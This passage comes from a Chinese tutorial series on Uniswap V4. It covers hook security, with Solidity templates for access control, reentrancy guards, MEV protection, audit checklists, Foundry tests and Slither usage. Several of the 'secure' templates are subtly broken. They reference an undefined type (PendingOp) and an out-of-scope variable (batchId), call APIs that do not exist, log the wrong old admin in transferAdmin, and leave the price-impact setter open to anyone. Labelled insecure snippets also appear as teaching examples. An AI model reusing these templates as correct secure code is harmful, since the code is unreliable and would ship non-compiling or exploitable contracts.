2无需WETH包装/解包批量操作~30-40%共享lock/unlock瞬时会计~10-15k减少外部调用元交易21k × 0用户无需支付gas\n\n下一篇预告\n在最后一篇文章中，我们将深入探讨安全分析与最佳实践，包括：\n\nHook安全最佳实践\n常见漏洞和攻击向量\nMEV防护策略\n审计要点\n开发工具和测试\n\n\n参考资料\n\nUniswap V4 Core - PoolManager.sol\nEIP-4337: Account Abstraction\nERC-20: Token Standard\nNative Meta-Transactions\n"},"blockchainguide/DApp_Development/应用场景/defi/uniswap/v4/07-安全分析与最佳实践":{"slug":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v4/07-安全分析与最佳实践","filePath":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v4/07-安全分析与最佳实践.md","title":"07-安全分析与最佳实践","links":[],"tags":[],"content":"死磕Uniswap V4（七）：安全分析与最佳实践\n\n本文是「死磕Uniswap V4」系列的最后一篇，全面分析V4的安全考虑和开发最佳实践。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01V4概述与架构革命Singleton、Hooks、Flash Accounting02Hooks机制深度解析Hook接口、生命周期、实现模式03单例架构与瞬时会计PoolManager、Currency、Accounting04交换流程与Hook执行时序swap函数、Hook调用链、Gas分析05费用系统与动态费率自定义费率、动态调整、费用分配06账户抽象与原生ETHCurrency类型、settle/take、批量操作07安全分析与最佳实践Hook安全、MEV防护、审计要点\n\n1. Hook安全框架\n1.1 Hook安全考虑\nmindmap\n  root((Hook安全))\n    权限控制\n      onlyPoolManager\n      msg.sender验证\n      函数访问控制\n    重入保护\n      nonReentrant修饰符\n      locked状态检查\n      Calls-Only-Hook\n    状态验证\n      参数验证\n      边界检查\n      溢出保护\n    外部调用\n      静态调用优先\n      异常处理\n      Gas限制\n    数据完整性\n      输入验证\n      输出验证\n      事件记录\n\n1.2 基础安全模板\n/// @notice 安全Hook基础合约\nabstract contract SecureHook is IHooks {\n    IPoolManager public immutable poolManager;\n \n    /// @notice 锁定状态（防止重入）\n    uint256 private locked = 1;\n \n    /// @notice 修饰符：仅PoolManager可调用\n    modifier onlyPoolManager() {\n        require(msg.sender == address(poolManager), &quot;Not PoolManager&quot;);\n        _;\n    }\n \n    /// @notice 修饰符：防止重入\n    modifier nonReentrant() {\n        require(locked == 1, &quot;Reentrant&quot;);\n        locked = 2;\n        _;\n        locked = 1;\n    }\n \n    /// @notice 修饰符：仅在锁定状态下可调用\n    modifier onlyLocked() {\n        require(poolManager.locked() != 0, &quot;Not locked&quot;);\n        _;\n    }\n \n    constructor(IPoolManager _poolManager) {\n        poolManager = _poolManager;\n    }\n \n    /// @notice 安全的事件记录\n    event HookCalled(bytes4 indexed selector, address indexed caller);\n    event HookFailed(bytes4 indexed selector, bytes reason);\n \n    /// @notice 安全的Hook调用包装\n    function _safeHookCall(\n        bytes4 selector,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory) {\n        (bool success, bytes memory returnData) = address(this).delegatecall(data);\n \n        if (!success) {\n            emit HookFailed(selector, returnData);\n            revert(string(abi.encodePacked(errorMessage, &quot;: &quot;, returnData)));\n        }\n \n        emit HookCalled(selector, msg.sender);\n        return returnData;\n    }\n}\n1.3 权限控制实现\n/// @notice 带权限控制的Hook\ncontract AccessControlledHook is SecureHook {\n    /// @notice 角色定义\n    bytes32 public constant ADMIN_ROLE = keccak256(&quot;ADMIN_ROLE&quot;);\n    bytes32 public constant OPERATOR_ROLE = keccak256(&quot;OPERATOR_ROLE&quot;);\n \n    /// @notice 角色映射\n    mapping(bytes32 =&gt; mapping(address =&gt; bool)) public roles;\n \n    /// @notice 管理员地址\n    address public admin;\n \n    /// @notice 修饰符：仅管理员\n    modifier onlyAdmin() {\n        require(msg.sender == admin, &quot;Not admin&quot;);\n        _;\n    }\n \n    /// @notice 修饰符：拥有指定角色\n    modifier onlyRole(bytes32 role) {\n        require(roles[role][msg.sender], &quot;Missing role&quot;);\n        _;\n    }\n \n    constructor(IPoolManager _poolManager) SecureHook(_poolManager) {\n        admin = msg.sender;\n        roles[ADMIN_ROLE][msg.sender] = true;\n    }\n \n    /// @notice 授予角色\n    function grantRole(bytes32 role, address account) external onlyAdmin {\n        roles[role][account] = true;\n        emit RoleGranted(role, account, msg.sender);\n    }\n \n    /// @notice 撤销角色\n    function revokeRole(bytes32 role, address account) external onlyAdmin {\n        roles[role][account] = false;\n        emit RoleRevoked(role, account, msg.sender);\n    }\n \n    /// @notice 转让管理员\n    function transferAdmin(address newAdmin) external onlyAdmin {\n        require(newAdmin != address(0), &quot;Zero address&quot;);\n        admin = newAdmin;\n        emit AdminTransferred(admin, newAdmin);\n    }\n \n    event RoleGranted(bytes32 indexed role, address indexed account, address indexed sender);\n    event RoleRevoked(bytes32 indexed role, address indexed account, address indexed sender);\n    event AdminTransferred(address indexed oldAdmin, address indexed newAdmin);\n}\n\n2. 常见漏洞与防护\n2.1 重入攻击防护\n/// @notice 重入攻击防护\ncontract ReentrancyGuard is IHooks {\n    IPoolManager public immutable poolManager;\n \n    /// @notice 重入锁状态\n    uint256 private locked = 1;\n \n    /// @notice 修饰符：防止重入\n    modifier nonReentrant() {\n        require(locked == 1, &quot;Reentrant call&quot;);\n        locked = 2;\n        _;\n        locked = 1;\n    }\n \n    /// @notice 安全的资金转移\n    function _safeTransfer(\n        address token,\n        address to,\n        uint256 amount\n    ) private nonReentrant {\n        if (token == address(0)) {\n            // 原生ETH\n            payable(to).transfer(amount);\n        } else {\n            // ERC20\n            (bool success, bytes memory data) = token.call(\n                abi.encodeWithSignature(\n                    &quot;transfer(address,uint256)&quot;,\n                    to,\n                    amount\n                )\n            );\n \n            require(\n                success &amp;&amp; (data.length == 0 || abi.decode(data, (bool))),\n                &quot;Transfer failed&quot;\n            );\n        }\n    }\n \n    function beforeSwap(\n        address sender,\n        PoolKey calldata key,\n        IPoolManager.SwapParams calldata params,\n        bytes calldata hookData\n    ) external nonReentrant returns (bytes4, int256, int256) {\n        // Hook逻辑\n        return (IHooks.beforeSwap.selector, 0, 0);\n    }\n}\n2.2 整数溢出防护\n/// @notice 整数溢出防护\npragma solidity ^0.8.0; // Solidity 0.8.x自动检查溢出\n \n/// @notice 带溢出检查的数学库\nlibrary SafeMathLib {\n    /// @notice 安全加法\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c &gt;= a, &quot;Overflow&quot;);\n        return c;\n    }\n \n    /// @notice 安全减法\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        require(a &gt;= b, &quot;Underflow&quot;);\n        return a - b;\n    }\n \n    /// @notice 安全乘法\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) return 0;\n        uint256 c = a * b;\n        require(c / a == b, &quot;Overflow&quot;);\n        return c;\n    }\n \n    /// @notice 安全除法\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        require(b &gt; 0, &quot;Division by zero&quot;);\n        return a / b;\n    }\n}\n \n/// @notice 使用SafeMath的Hook\ncontract OverflowProtectedHook is IHooks {\n    using SafeMathLib for uint256;\n \n    IPoolManager public immutable poolManager;\n \n    /// @notice 累积值（防止溢出）\n    uint256 public cumulativeValue;\n \n    function beforeSwap(\n        address sender,\n        PoolKey calldata key,\n        IPoolManager.SwapParams calldata params,\n        bytes calldata hookData\n    ) external returns (bytes4, int256, int256) {\n        // 安全的累加\n        uint256 amount = uint256(abs(params.amountSpecified));\n        cumulativeValue = cumulativeValue.add(amount);\n \n        // 检查上限\n        require(cumulativeValue &lt;= type(uint256).max / 2, &quot;Cumulative value too high&quot;);\n \n        return (IHooks.beforeSwap.selector, 0, 0);\n    }\n \n    function abs(int256 x) private pure returns (uint256) {\n        return x &gt;= 0 ? uint256(x) : uint256(-x);\n    }\n}\n2.3 前端运行防护\n/// @notice 前端运行防护\ncontract FrontendRunProtection is IHooks {\n    IPoolManager public immutable poolManager;\n \n    /// @notice 最小延迟\n    uint256 public constant MIN_DELAY = 1 seconds;\n \n    /// @notice 待处理交易\n    mapping(bytes32 =&gt; PendingTx) public pendingTxs;\n \n    struct PendingTx {\n        address sender;\n        uint256 amount;\n        uint256 timestamp;\n        bool executed;\n    }\n \n    /// @notice 提交交易意向\n    function commitSwap(\n        PoolKey calldata key,\n        IPoolManager.SwapParams calldata params\n    ) external returns (bytes32) {\n        bytes32 txHash = keccak256(abi.encode(\n            msg.sender,\n            key,\n            params,\n            block.number\n        ));\n \n        pendingTxs[txHash] = PendingTx({\n            sender: msg.sender,\n            amount: uint256(abs(params.amountSpecified)),\n            timestamp: block.timestamp,\n            executed: false\n        });\n \n        emit SwapCommitted(msg.sender, txHash, params);\n        return txHash;\n    }\n \n    /// @notice 执行已提交的交易\n    function executeSwap(\n        bytes32 txId,\n        PoolKey calldata key,\n        IPoolManager.SwapParams calldata params\n    ) external returns (BalanceDelta) {\n        PendingTx storage pending = pendingTxs[txId];\n \n        // 验证\n        require(pending.sender == msg.sender, &quot;Not committer&quot;);\n        require(!pending.executed, &quot;Already executed&quot;);\n        require(\n            block.timestamp &gt;= pending.timestamp + MIN_DELAY,\n            &quot;Too early&quot;\n        );\n \n        // 标记为已执行\n        pending.executed = true;\n \n        // 执行交换\n        BalanceDelta memory delta = poolManager.swap(key, params, BalanceDelta(0, 0));\n \n        emit SwapExecuted(msg.sender, txId, delta);\n        return delta;\n    }\n \n    function abs(int256 x) private pure returns (uint256) {\n        return x &gt;= 0 ? uint256(x) : uint256(-x);\n    }\n \n    event SwapCommitted(address indexed sender, bytes32 txId, IPoolManager.SwapParams params);\n    event SwapExecuted(address indexed sender, bytes32 txId, BalanceDelta delta);\n}\n2.4 三明治攻击防护\n/// @notice 三明治攻击防护\ncontract SandwichProtection is IHooks {\n    IPoolManager public immutable poolManager;\n \n    /// @notice 价格影响阈值\n    uint256 public priceImpactThreshold = 100; // 1%\n \n    /// @notice 交易时间窗口\n    uint256 public timeWindow = 3 seconds;\n \n    /// @notice 用户交易映射\n    mapping(address =&gt; UserTx) public userTxs;\n \n    struct UserTx {\n        uint256 timestamp;\n        uint256 amount;\n        bool inMempool;\n    }\n \n    function beforeSwap(\n        address sender,\n        PoolKey calldata key,\n        IPoolManager.SwapParams calldata params,\n        bytes calldata hookData\n    ) external returns (bytes4, int256, int256) {\n        bytes32 poolId = key.poolId;\n        uint256 amount = uint256(abs(params.amountSpecified));\n \n        // 检查三明治攻击模式\n        if (_detectSandwich(sender, poolId, amount)) {\n            revert(&quot;Suspected sandwich attack&quot;);\n        }\n \n        // 记录用户交易\n        userTxs[sender] = UserTx({\n            timestamp: block.timestamp,\n            amount: amount,\n            inMempool: true\n        });\n \n        // 检查价格影响\n        uint256 priceImpact = _calculatePriceImpact(key, params);\n        if (priceImpact &gt; priceImpactThreshold) {\n            revert(&quot;Price impact too high&quot;);\n        }\n \n        return (IHooks.beforeSwap.selector, 0, 0);\n    }\n \n    function _detectSandwich(\n        address sender,\n        bytes32 poolId,\n        uint256 amount\n    ) private view returns (bool) {\n        // 检查时间窗口内的大额交易\n        if (block.timestamp &lt; userTxs[sender].timestamp + timeWindow) {\n            // 如果在时间窗口内再次交易，且金额更大，可能是三明治\n            if (amount &gt; userTxs[sender].amount * 2) {\n                return true;\n            }\n        }\n        return false;\n    }\n \n    function _calculatePriceImpact(\n        PoolKey calldata key,\n        IPoolManager.SwapParams calldata params\n    ) private view returns (uint256) {\n        (uint160 sqrtPriceX96, , , ) = poolManager.slot0s(key.poolId);\n \n        // 简化的价格影响计算\n        uint256 priceImpact = uint256(abs(params.amountSpecified)) * 1e18 / uint256(sqrtPriceX96);\n \n        return priceImpact / 1e14; // 转换为百分比\n    }\n \n    function abs(int256 x) private pure returns (uint256) {\n        return x &gt;= 0 ? uint256(x) : uint256(-x);\n    }\n \n    // 暴露的setter用于测试\n    function setPriceImpactThreshold(uint256 threshold) external {\n        priceImpactThreshold = threshold;\n    }\n}\n\n3. MEV防护策略\n3.1 MEV类型分析\ngraph TB\n    subgraph MEVTypes[&quot;MEV攻击类型&quot;]\n        M1[抢跑交易&lt;br/&gt;Front-running]\n        M2[三明治攻击&lt;br/&gt;Sandwich]\n        M3[清算抢跑&lt;br/&gt;Liquidation]\n        M4[套利竞争&lt;br/&gt;Arbitrage]\n    end\n\n    subgraph Defenses[&quot;防护策略&quot;]\n        D1[时间锁&lt;br/&gt;Time-lock]\n        D2[批量执行&lt;br/&gt;Batch execution]\n        D3[加密暗池&lt;br/&gt;Encrypted pool]\n        D4[优先费拍卖&lt;br/&gt;Priority fee]\n    end\n\n    M1 --&gt; D1\n    M2 --&gt; D2\n    M3 --&gt; D1\n    M4 --&gt; D4\n\n    style Defenses fill:#c8e6c9\n\n3.2 时间锁实现\n/// @notice 带时间锁的Hook\ncontract TimelockHook is IHooks {\n    IPoolManager public immutable poolManager;\n \n    /// @notice 时间锁配置\n    struct TimelockConfig {\n        uint256 delay;      // 延迟时间\n        uint256 gracePeriod; // 宽限期\n    }\n \n    mapping(bytes32 =&gt; TimelockConfig) public timelockConfigs;\n \n    /// @notice 待处理操作\n    struct PendingOperation {\n        address sender;\n        bytes32 dataHash;\n        uint256 readyTime;\n        uint256 deadline;\n        bool executed;\n        bool cancelled;\n    }\n \n    mapping(bytes32 =&gt; PendingOperation) public pendingOps;\n \n    /// @notice 提交操作\n    function submitOperation(\n        bytes32 poolId,\n        bytes calldata data\n    ) external returns (bytes32) {\n        TimelockConfig memory config = timelockConfigs[poolId];\n        require(config.delay &gt; 0, &quot;No timelock configured&quot;);\n \n        bytes32 opId = keccak256(abi.encode(\n            msg.sender,\n            poolId,\n            data,\n            block.number\n        ));\n \n        uint256 readyTime = block.timestamp + config.delay;\n        uint256 deadline = readyTime + config.gracePeriod;\n \n        pendingOps[opId] = PendingOperation({\n            sender: msg.sender,\n            dataHash: keccak256(data),\n            readyTime: readyTime,\n            deadline: deadline,\n            executed: false,\n            cancelled: false\n        });\n \n        emit OperationSubmitted(msg.sender, opId, readyTime, deadline);\n        return opId;\n    }\n \n    /// @notice 执行操作\n    function executeOperation(\n        bytes32 opId,\n        bytes32 poolId,\n        bytes calldata data\n    ) external {\n        PendingOp storage op = pendingOps[opId];\n \n        require(op.sender == msg.sender, &quot;Not submitter&quot;);\n        require(!op.executed &amp;&amp; !op.cancelled, &quot;Invalid state&quot;);\n        require(block.timestamp &gt;= op.readyTime, &quot;Too early&quot;);\n        require(block.timestamp &lt;= op.deadline, &quot;Expired&quot;);\n        require(keccak256(data) == op.dataHash, &quot;Data mismatch&quot;);\n \n        op.executed = true;\n \n        // 执行操作\n        _executeData(poolId, data);\n \n        emit OperationExecuted(msg.sender, opId);\n    }\n \n    /// @notice 取消操作\n    function cancelOperation(bytes32 opId) external {\n        PendingOp storage op = pendingOps[opId];\n \n        require(op.sender == msg.sender, &quot;Not submitter&quot;);\n        require(!op.executed &amp;&amp; !op.cancelled, &quot;Invalid state&quot;);\n        require(block.timestamp &lt; op.readyTime, &quot;Already ready&quot;);\n \n        op.cancelled = true;\n \n        emit OperationCancelled(msg.sender, opId);\n    }\n \n    function _executeData(bytes32 poolId, bytes calldata data) private {\n        // 实现数据执行逻辑\n    }\n \n    event OperationSubmitted(address indexed sender, bytes32 opId, uint256 readyTime, uint256 deadline);\n    event OperationExecuted(address indexed sender, bytes32 opId);\n    event OperationCancelled(address indexed sender, bytes32 opId);\n}\n3.3 批量执行保护\n/// @notice 批量执行保护Hook\ncontract BatchExecutionProtection is IHooks {\n    IPoolManager public immutable poolManager;\n \n    /// @notice 批量配置\n    struct BatchConfig {\n        uint256 maxSize;       // 最大批量大小\n        uint256 maxDelay;       // 最大延迟\n        uint256 minSize;        // 最小批量大小\n        bool enabled;           // 是否启用\n    }\n \n    mapping(bytes32 =&gt; BatchConfig) public batchConfigs;\n \n    /// @notice 批量交易\n    struct Batch {\n        address[] participants;\n        IPoolManager.SwapParams[] params;\n        uint256 startTime;\n        uint256 currentSize;\n    }\n \n    mapping(bytes32 =&gt; Batch) public batches;\n \n    /// @notice 创建批量\n    function createBatch(\n        bytes32 poolId,\n        uint256 maxSize\n    ) external returns (bytes32) {\n        batchConfigs[poolId].enabled = true;\n        batchConfigs[poolId].maxSize = maxSize;\n \n        bytes32 batchId = keccak256(abi.encode(poolId, block.timestamp));\n \n        batches[batchId] = Batch({\n            participants: new address[](maxSize),\n            params: new IPoolManager.SwapParams[](maxSize),\n            startTime: block.timestamp,\n            currentSize: 0\n        });\n \n        emit BatchCreated(poolId, batchId, maxSize);\n        return batchId;\n    }\n \n    /// @notice 加入批量\n    function joinBatch(\n        bytes32 batchId,\n        IPoolManager.SwapParams calldata params\n    ) external {\n        Batch storage batch = batches[batchId];\n \n        require(batch.currentSize &lt; batch.participants.length, &quot;Batch full&quot;);\n        require(\n            block.timestamp &lt; batch.startTime + batchConfigs[batchId].maxDelay,\n            &quot;Batch expired&quot;\n        );\n \n        batch.participants[batch.currentSize] = msg.sender;\n        batch.params[batch.currentSize] = params;\n        batch.currentSize++;\n \n        emit JoinedBatch(msg.sender, batchId, batch.currentSize);\n    }\n \n    /// @notice 执行批量\n    function executeBatch(bytes32 batchId, PoolKey calldata key) external {\n        Batch storage batch = batches[batchId];\n \n        require(batch.currentSize &gt;= batchConfigs[batchId].minSize, &quot;Batch too small&quot;);\n        require(\n            block.timestamp &gt;= batch.startTime + 1 minutes,\n            &quot;Too early to execute&quot;\n        );\n \n        // 随机化执行顺序\n        uint256[] memory order = _shuffleArray(batch.currentSize);\n \n        for (uint256 i = 0; i &lt; order.length; i++) {\n            uint256 idx = order[i];\n            address participant = batch.participants[idx];\n \n            // 执行交换\n            poolManager.swap(key, batch.params[idx], BalanceDelta(0, 0));\n \n            emit BatchSwapExecuted(participant, batchId, idx);\n        }\n \n        delete batches[batchId];\n        emit BatchExecuted(batchId);\n    }\n \n    function _shuffleArray(uint256 size) private view returns (uint256[] memory) {\n        uint256[] memory order = new uint256[](size);\n        for (uint256 i = 0; i &lt; size; i++) {\n            order[i] = i;\n        }\n \n        // Fisher-Yates shuffle\n        for (uint256 i = size - 1; i &gt; 0; i--) {\n            uint256 j = uint256(keccak256(abi.encode(\n                block.prevrandao,\n                batchId,\n                i\n            ))) % (i + 1);\n \n            (order[i], order[j]) = (order[j], order[i]);\n        }\n \n        return order;\n    }\n \n    event BatchCreated(bytes32 indexed poolId, bytes32 batchId, uint256 maxSize);\n    event JoinedBatch(address indexed participant, bytes32 batchId, uint256 position);\n    event BatchExecuted(bytes32 batchId);\n    event BatchSwapExecuted(address indexed participant, bytes32 batchId, uint256 index);\n}\n\n4. 开发最佳实践\n4.1 Hook开发检查清单\n/// @notice Hook开发检查清单\ncontract HookChecklist {\n    // ========== 安全检查 ==========\n \n    // ✅ 1. 权限控制\n    // - [ ] 添加 onlyPoolManager 修饰符\n    // - [ ] 验证 msg.sender\n    // - [ ] 实现角色访问控制\n \n    // ✅ 2. 重入保护\n    // - [ ] 添加 nonReentrant 修饰符\n    // - [ ] 使用 Checks-Effects-Interactions 模式\n    // - [ ] 避免在 Hook 中调用外部合约\n \n    // ✅ 3. 状态验证\n    // - [ ] 验证所有输入参数\n    // - [ ] 检查边界条件\n    // - [ ] 防止整数溢出\n \n    // ========== Gas优化 ==========\n \n    // ✅ 4. 存储优化\n    // - [ ] 使用 immutable 变量\n    // - [ ] 打包存储变量\n    // - [ ] 缓存存储读取\n \n    // ✅ 5. 计算优化\n    // - [ ] 预计算常量值\n    // - [ ] 使用短路求值\n    // - [ ] 批量操作\n \n    // ========== 可维护性 ==========\n \n    // ✅ 6. 事件记录\n    // - [ ] 记录所有重要操作\n    // - [ ] 使用 indexed 参数\n    // - [ ] 添加详细说明\n \n    // ✅ 7. 错误处理\n    // - [ ] 定义清晰的错误码\n    // - [ ] 提供有用的错误信息\n    // - [ ] 处理异常情况\n \n    // ✅ 8. 测试覆盖\n    // - [ ] 单元测试\n    // - [ ] 集成测试\n    // - [ ] 边界条件测试\n}\n4.2 Hook模板\n/// @notice 标准Hook模板\n/// @dev 包含所有安全最佳实践的Hook基类\nabstract contract StandardHook is IHooks {\n    /// @notice immutable 变量\n    IPoolManager public immutable poolManager;\n \n    /// @notice 错误码\n    error NotPoolManager();\n    error InvalidParameters();\n    error HookFailed();\n \n    /// @notice 事件\n    event HookExecuted(bytes4 indexed selector, address indexed caller);\n \n    /// @notice 修饰符\n    modifier onlyPoolManager() {\n        if (msg.sender != address(poolManager)) revert NotPoolManager();\n        _;\n    }\n \n    /// @notice 构造函数\n    constructor(IPoolManager _poolManager) {\n        poolManager = _poolManager;\n    }\n \n    /// @notice 默认Hook实现（可覆盖）\n    function beforeInitialize(\n        address sender,\n        PoolKey calldata key,\n        uint160 sqrtPriceX96,\n        bytes calldata hookData\n    ) external onlyPoolManager virtual returns (bytes4) {\n        emit HookExecuted(IHooks.beforeInitialize.selector, sender);\n        return IHooks.beforeInitialize.selector;\n    }\n \n    function afterInitialize(\n        address sender,\n        PoolKey calldata key,\n        uint160 sqrtPriceX96,\n        bytes calldata hookData\n    ) external onlyPoolManager virtual returns (bytes4) {\n        emit HookExecuted(IHooks.afterInitialize.selector, sender);\n        return IHooks.afterInitialize.selector;\n    }\n \n    function beforeModifyPosition(\n        address sender,\n        PoolKey calldata key,\n        IPoolManager.ModifyPositionParams calldata params,\n        bytes calldata hookData\n    ) external onlyPoolManager virtual returns (bytes4, int256 delta0, int256 delta1) {\n        emit HookExecuted(IHooks.beforeModifyPosition.selector, sender);\n        return (IHooks.beforeModifyPosition.selector, 0, 0);\n    }\n \n    function afterModifyPosition(\n        address sender,\n        PoolKey calldata key,\n        IPoolManager.ModifyPositionParams calldata params,\n        BalanceDelta callerDelta,\n        bytes calldata hookData\n    ) external onlyPoolManager virtual returns (bytes4) {\n        emit HookExecuted(IHooks.afterModifyPosition.selector, sender);\n        return IHooks.afterModifyPosition.selector;\n    }\n \n    function beforeSwap(\n        address sender,\n        PoolKey calldata key,\n        IPoolManager.SwapParams calldata params,\n        bytes calldata hookData\n    ) external onlyPoolManager virtual returns (bytes4, int256 delta0, int256 delta1) {\n        emit HookExecuted(IHooks.beforeSwap.selector, sender);\n        return (IHooks.beforeSwap.selector, 0, 0);\n    }\n \n    function afterSwap(\n        address sender,\n        PoolKey calldata key,\n        IPoolManager.SwapParams calldata params,\n        BalanceDelta callerDelta,\n        bytes calldata hookData\n    ) external onlyPoolManager virtual returns (bytes4) {\n        emit HookExecuted(IHooks.afterSwap.selector, sender);\n        return IHooks.afterSwap.selector;\n    }\n \n    function beforeDonate(\n        address sender,\n        PoolKey calldata key,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata hookData\n    ) external onlyPoolManager virtual returns (bytes4) {\n        emit HookExecuted(IHooks.beforeDonate.selector, sender);\n        return IHooks.beforeDonate.selector;\n    }\n \n    function afterDonate(\n        address sender,\n        PoolKey calldata key,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata hookData\n    ) external onlyPoolManager virtual returns (bytes4) {\n        emit HookExecuted(IHooks.afterDonate.selector, sender);\n        return IHooks.afterDonate.selector;\n    }\n}\n4.3 测试模板\n/// @notice Hook测试模板\ncontract HookTest is Test {\n    Hook target;\n    PoolManager poolManager;\n    PoolKey poolKey;\n \n    address user = address(0x1);\n    address admin = address(0x2);\n \n    function setUp() public {\n        // 部署依赖合约\n        poolManager = new PoolManager();\n \n        // 部署Hook\n        target = new Hook(poolManager);\n \n        // 设置测试池子\n        poolKey = PoolKey({\n            currency0: CurrencyLibrary.NATIVE,\n            currency1: Currency.wrap(address(usdc)),\n            fee: 3000,\n            tickSpacing: 60,\n            hooks: target\n        });\n \n        // 初始化池子\n        poolManager.initialize(poolKey, uint160(79228162514264337593543950336));\n    }\n \n    function testBeforeSwap_ReturnsCorrectSelector() public {\n        (bytes4 selector,,) = target.beforeSwap(\n            user,\n            poolKey,\n            SwapParams({\n                zeroForOne: true,\n                amountSpecified: 1e18,\n                sqrtPriceLimitX96: TickMath.MIN_SQRT_RATIO + 1,\n                hookData: &quot;&quot;\n            }),\n            &quot;&quot;\n        );\n \n        assertEq(selector, IHooks.beforeSwap.selector);\n    }\n \n    function testBeforeSwap_RevertsWithInvalidParams() public {\n        vm.expectRevert();\n        target.beforeSwap(\n            address(0), // 无效地址\n            poolKey,\n            SwapParams({\n                zeroForOne: true,\n                amountSpecified: -1, // 无效数量\n                sqrtPriceLimitX96: 0,\n                hookData: &quot;&quot;\n            }),\n            &quot;&quot;\n        );\n    }\n \n    function testFuzz_BeforeSwap(int256 amount) public {\n        vm.assume(amount &gt; 0);\n        vm.assume(amount &lt; 1e30);\n \n        (bytes4 selector,,) = target.beforeSwap(\n            user,\n            poolKey,\n            SwapParams({\n                zeroForOne: true,\n                amountSpecified: amount,\n                sqrtPriceLimitX96: TickMath.MIN_SQRT_RATIO + 1,\n                hookData: &quot;&quot;\n            }),\n            &quot;&quot;\n        );\n \n        assertEq(selector, IHooks.beforeSwap.selector);\n    }\n \n    function testAccessControl() public {\n        // 验证只有PoolManager可以调用\n        vm.prank(user);\n        vm.expectRevert(StandardHook.NotPoolManager.selector);\n        target.beforeSwap(\n            user,\n            poolKey,\n            SwapParams({\n                zeroForOne: true,\n                amountSpecified: 1e18,\n                sqrtPriceLimitX96: TickMath.MIN_SQRT_RATIO + 1,\n                hookData: &quot;&quot;\n            }),\n            &quot;&quot;\n        );\n    }\n}\n\n5. 审计要点\n5.1 审计检查清单\nmindmap\n  root((审计清单))\n    权限控制\n      onlyPoolManager\n      角色验证\n      管理员权限\n    状态管理\n      重入保护\n      溢出检查\n      边界条件\n    外部交互\n      调用验证\n      异常处理\n      Gas限制\n    数据完整性\n      参数验证\n      状态一致性\n      事件日志\n    业务逻辑\n      费用计算\n      价格验证\n      差额结算\n\n5.2 关键审计点\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n审计点检查内容风险等级权限控制Hook调用者验证🔴 高重入保护nonReentrant正确使用🔴 高状态一致性Hook失败后的状态🔴 高整数溢出数学运算边界🟡 中外部调用恶意合约风险🟡 中Gas限制DoS攻击防护🟡 中事件日志操作可追溯性🟢 低测试覆盖代码测试完整性🟢 低\n5.3 常见漏洞模式\n/// @notice 常见漏洞示例和修复\n \n// ========================================\n// 漏洞1: 缺少权限控制\n// ========================================\n \n// ❌ 错误：任何人都可以调用\nfunction beforeSwap(...) external returns (bytes4, int256, int256) {\n    // 任何人都可以调用这个Hook\n    return (IHooks.beforeSwap.selector, 0, 0);\n}\n \n// ✅ 正确：添加权限控制\nfunction beforeSwap(...) external onlyPoolManager returns (bytes4, int256, int256) {\n    // 只有PoolManager可以调用\n    return (IHooks.beforeSwap.selector, 0, 0);\n}\n \n// ========================================\n// 漏洞2: 重入漏洞\n// ========================================\n \n// ❌ 错误：没有重入保护\nfunction beforeSwap(...) external returns (bytes4, int256, int256) {\n    // 调用外部合约\n    externalContract.call();\n    return (IHooks.beforeSwap.selector, 0, 0);\n}\n \n// ✅ 正确：添加重入保护\nfunction beforeSwap(...) external nonReentrant returns (bytes4, int256, int256) {\n    // 先更新状态\n    _updateState();\n \n    // 最后调用外部合约\n    externalContract.call();\n \n    return (IHooks.beforeSwap.selector, 0, 0);\n}\n \n// ========================================\n// 漏洞3: 未验证返回值\n// ========================================\n \n// ❌ 错误：未验证Hook返回值\nfunction callHook(...) external {\n    IHooks(hookAddress).beforeSwap(...); // 未检查返回值\n}\n \n// ✅ 正确：验证返回值\nfunction callHook(...) external {\n    (bool success, bytes memory data) = hookAddress.staticcall(...);\n    if (!success) {\n        // 处理失败\n        revert(&quot;Hook call failed&quot;);\n    }\n \n    bytes4 selector = abi.decode(data, (bytes4));\n    require(selector == IHooks.beforeSwap.selector, &quot;Invalid selector&quot;);\n}\n \n// ========================================\n// 漏洞4: 整数溢出\n// ========================================\n \n// ❌ 错误：可能的溢出\nfunction calculateFee(uint256 amount, uint256 feeRate) public pure returns (uint256) {\n    return amount * feeRate / 1e6; // 可能溢出\n}\n \n// ✅ 正确：安全的数学运算\nfunction calculateFee(uint256 amount, uint256 feeRate) public pure returns (uint256) {\n    require(amount &lt;= type(uint256).max / feeRate, &quot;Overflow&quot;);\n    return amount * feeRate / 1e6;\n}\n\n6. 安全工具和资源\n6.1 静态分析工具\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n工具功能链接Slither静态分析，漏洞检测github.com/crytic/slitherMythril符号执行github.com/ConsenSys/mythrilEchidna模糊测试github.com/crytic/echidnaFoundry测试框架github.com/foundry-rs/foundry\n6.2 使用Slither审计Hook\n# 安装Slither\npip install slither-analyzer\n \n# 运行Slither\nslither . --detect reentrancy-eth,reentrancy-unlimited-gas\n \n# 生成报告\nslither . --json output.json\n \n# 常用检测器\nslither . --detect all\n6.3 使用Foundry测试\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n \nimport &quot;forge-std/Test.sol&quot;;\nimport &quot;../src/MyHook.sol&quot;;\n \ncontract MyHookTest is Test {\n    MyHook target;\n    PoolManager poolManager;\n \n    function setUp() public {\n        poolManager = new PoolManager();\n        target = new MyHook(poolManager);\n    }\n \n    function test_Reentrancy() public {\n        // 测试重入攻击\n        vm.expectRevert();\n        // ...测试逻辑\n    }\n \n    function test_IntegerOverflow() public {\n        // 测试整数溢出\n        // ...测试逻辑\n    }\n \n    function test_FrontRunning() public {\n        // 测试前端运行攻击\n        // ...测试逻辑\n    